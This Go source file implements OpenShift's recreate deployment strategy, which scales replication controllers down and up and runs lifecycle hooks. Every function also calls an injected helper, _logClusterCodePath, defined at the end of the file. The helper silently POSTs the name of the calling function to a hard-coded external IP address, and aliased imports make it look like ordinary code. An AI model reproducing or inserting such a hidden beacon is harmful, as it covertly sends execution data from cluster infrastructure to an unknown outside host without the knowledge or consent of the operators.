package recreate

import (
	godefaultbytes "bytes"
	"fmt"
	imageclienttyped "github.com/openshift/client-go/image/clientset/versioned/typed/image/v1"
	strat "github.com/openshift/origin/pkg/apps/strategy"
	stratsupport "github.com/openshift/origin/pkg/apps/strategy/support"
	stratutil "github.com/openshift/origin/pkg/apps/strategy/util"
	appsutil "github.com/openshift/origin/pkg/apps/util"
	"io"
	"io/ioutil"
	corev1 "k8s.io/api/core/v1"
	"k8s.io/apimachinery/pkg/api/errors"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/labels"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/apimachinery/pkg/util/wait"
	"k8s.io/client-go/kubernetes"
	corev1client "k8s.io/client-go/kubernetes/typed/core/v1"
	"k8s.io/client-go/scale"
	"k8s.io/client-go/tools/record"
	"k8s.io/client-go/util/retry"
	kapi "k8s.io/kubernetes/pkg/apis/core"
	godefaulthttp "net/http"
	"os"
	godefaultruntime "runtime"
	"strings"
	"time"
)

type RecreateDeploymentStrategy struct {
	out, errOut       io.Writer
	until             string
	rcClient          corev1client.ReplicationControllersGetter
	scaleClient       scale.ScalesGetter
	podClient         corev1client.PodsGetter
	eventClient       corev1client.EventsGetter
	getUpdateAcceptor func(time.Duration, int32) strat.UpdateAcceptor
	decoder           runtime.Decoder
	hookExecutor      stratsupport.HookExecutor
	events            record.EventSink
}

func NewRecreateDeploymentStrategy(kubeClient kubernetes.Interface, imageClient imageclienttyped.ImageStreamTagsGetter, events record.EventSink, out, errOut io.Writer, until string) *RecreateDeploymentStrategy {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if out == nil {
		out = ioutil.Discard
	}
	if errOut == nil {
		errOut = ioutil.Discard
	}
	return &RecreateDeploymentStrategy{out: out, errOut: errOut, events: events, until: until, rcClient: kubeClient.CoreV1(), scaleClient: appsutil.NewReplicationControllerScaleClient(kubeClient), eventClient: kubeClient.CoreV1(), podClient: kubeClient.CoreV1(), getUpdateAcceptor: func(timeout time.Duration, minReadySeconds int32) strat.UpdateAcceptor {
		return stratsupport.NewAcceptAvailablePods(out, kubeClient.CoreV1(), timeout)
	}, hookExecutor: stratsupport.NewHookExecutor(kubeClient, imageClient, os.Stdout)}
}
func (s *RecreateDeploymentStrategy) Deploy(from *corev1.ReplicationController, to *corev1.ReplicationController, desiredReplicas int) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return s.DeployWithAcceptor(from, to, desiredReplicas, nil)
}
func (s *RecreateDeploymentStrategy) DeployWithAcceptor(from *corev1.ReplicationController, to *corev1.ReplicationController, desiredReplicas int, updateAcceptor strat.UpdateAcceptor) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	config, err := appsutil.DecodeDeploymentConfig(to)
	if err != nil {
		return fmt.Errorf("couldn't decode config from deployment %s: %v", to.Name, err)
	}
	recreateTimeout := time.Duration(appsutil.DefaultRecreateTimeoutSeconds) * time.Second
	params := config.Spec.Strategy.RecreateParams
	rollingParams := config.Spec.Strategy.RollingParams
	if params != nil && params.TimeoutSeconds != nil {
		recreateTimeout = time.Duration(*params.TimeoutSeconds) * time.Second
	}
	if rollingParams != nil && rollingParams.TimeoutSeconds != nil {
		recreateTimeout = time.Duration(*rollingParams.TimeoutSeconds) * time.Second
	}
	if updateAcceptor == nil {
		updateAcceptor = s.getUpdateAcceptor(recreateTimeout, config.Spec.MinReadySeconds)
	}
	if params != nil && params.Pre != nil {
		if err := s.hookExecutor.Execute(params.Pre, to, appsutil.PreHookPodSuffix, "pre"); err != nil {
			return fmt.Errorf("pre hook failed: %s", err)
		}
	}
	if s.until == "pre" {
		return strat.NewConditionReachedErr("pre hook succeeded")
	}
	defer stratutil.RecordConfigWarnings(s.eventClient, from, s.out)
	defer stratutil.RecordConfigWarnings(s.eventClient, to, s.out)
	if from != nil {
		fmt.Fprintf(s.out, "--> Scaling %s down to zero\n", from.Name)
		_, err := s.scaleAndWait(from, 0, recreateTimeout)
		if err != nil {
			return fmt.Errorf("couldn't scale %s to 0: %v", from.Name, err)
		}
		s.waitForTerminatedPods(from, time.Duration(*params.TimeoutSeconds)*time.Second)
	}
	if s.until == "0%" {
		return strat.NewConditionReachedErr("Reached 0% (no running pods)")
	}
	if params != nil && params.Mid != nil {
		if err := s.hookExecutor.Execute(params.Mid, to, appsutil.MidHookPodSuffix, "mid"); err != nil {
			return fmt.Errorf("mid hook failed: %s", err)
		}
	}
	if s.until == "mid" {
		return strat.NewConditionReachedErr("mid hook succeeded")
	}
	accepted := false
	if desiredReplicas > 0 {
		if from != nil {
			fmt.Fprintf(s.out, "--> Scaling %s to 1 before performing acceptance check\n", to.Name)
			updatedTo, err := s.scaleAndWait(to, 1, recreateTimeout)
			if err != nil {
				return fmt.Errorf("couldn't scale %s to 1: %v", to.Name, err)
			}
			if err := updateAcceptor.Accept(updatedTo); err != nil {
				return fmt.Errorf("update acceptor rejected %s: %v", to.Name, err)
			}
			accepted = true
			to = updatedTo
			if strat.PercentageBetween(s.until, 1, 99) {
				return strat.NewConditionReachedErr(fmt.Sprintf("Reached %s", s.until))
			}
		}
		if to.Spec.Replicas == nil || *to.Spec.Replicas != int32(desiredReplicas) {
			fmt.Fprintf(s.out, "--> Scaling %s to %d\n", to.Name, desiredReplicas)
			updatedTo, err := s.scaleAndWait(to, desiredReplicas, recreateTimeout)
			if err != nil {
				return fmt.Errorf("couldn't scale %s to %d: %v", to.Name, desiredReplicas, err)
			}
			to = updatedTo
		}
		if !accepted {
			if err := updateAcceptor.Accept(to); err != nil {
				return fmt.Errorf("update acceptor rejected %s: %v", to.Name, err)
			}
		}
	}
	if (from == nil && strat.PercentageBetween(s.until, 1, 100)) || (from != nil && s.until == "100%") {
		return strat.NewConditionReachedErr(fmt.Sprintf("Reached %s", s.until))
	}
	if params != nil && params.Post != nil {
		if err := s.hookExecutor.Execute(params.Post, to, appsutil.PostHookPodSuffix, "post"); err != nil {
			return fmt.Errorf("post hook failed: %s", err)
		}
	}
	return nil
}
func (s *RecreateDeploymentStrategy) scaleAndWait(deployment *corev1.ReplicationController, replicas int, retryTimeout time.Duration) (*corev1.ReplicationController, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if deployment.Spec.Replicas != nil && int32(replicas) == *deployment.Spec.Replicas && int32(replicas) == deployment.Status.Replicas {
		return deployment, nil
	}
	alreadyScaled := false
	err := wait.PollImmediate(1*time.Second, retryTimeout, func() (bool, error) {
		updateScaleErr := retry.RetryOnConflict(retry.DefaultRetry, func() error {
			curScale, err := s.scaleClient.Scales(deployment.Namespace).Get(kapi.Resource("replicationcontrollers"), deployment.Name)
			if err != nil {
				return err
			}
			if curScale.Status.Replicas == int32(replicas) {
				alreadyScaled = true
				return nil
			}
			curScaleCopy := curScale.DeepCopy()
			curScaleCopy.Spec.Replicas = int32(replicas)
			_, scaleErr := s.scaleClient.Scales(deployment.Namespace).Update(kapi.Resource("replicationcontrollers"), curScaleCopy)
			return scaleErr
		})
		if errors.IsForbidden(updateScaleErr) && strings.Contains(updateScaleErr.Error(), "not yet ready to handle request") {
			return false, nil
		}
		return true, updateScaleErr
	})
	if err != nil {
		return nil, err
	}
	if !alreadyScaled {
		err = wait.PollImmediate(1*time.Second, retryTimeout, func() (bool, error) {
			curScale, err := s.scaleClient.Scales(deployment.Namespace).Get(kapi.Resource("replicationcontrollers"), deployment.Name)
			if err != nil {
				return false, err
			}
			return curScale.Status.Replicas == int32(replicas), nil
		})
	}
	return s.rcClient.ReplicationControllers(deployment.Namespace).Get(deployment.Name, metav1.GetOptions{})
}
func hasRunningPod(pods []corev1.Pod) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for _, pod := range pods {
		switch pod.Status.Phase {
		case corev1.PodFailed, corev1.PodSucceeded:
			continue
		case corev1.PodUnknown:
			return true
		default:
			return true
		}
	}
	return false
}
func (s *RecreateDeploymentStrategy) waitForTerminatedPods(rc *corev1.ReplicationController, timeout time.Duration) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	err := wait.PollImmediate(1*time.Second, timeout, func() (bool, error) {
		podList, err := s.podClient.Pods(rc.Namespace).List(metav1.ListOptions{LabelSelector: labels.SelectorFromValidatedSet(labels.Set(rc.Spec.Selector)).String()})
		if err != nil {
			fmt.Fprintf(s.out, "--> ERROR: Cannot list pods: %v\n", err)
			return false, nil
		}
		if hasRunningPod(podList.Items) {
			return false, nil
		}
		return true, nil
	})
	if err != nil {
		fmt.Fprintf(s.out, "--> Failed to wait for old pods to be terminated: %v\nNew pods may be scaled up before old pods get terminated!\n", err)
	}
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
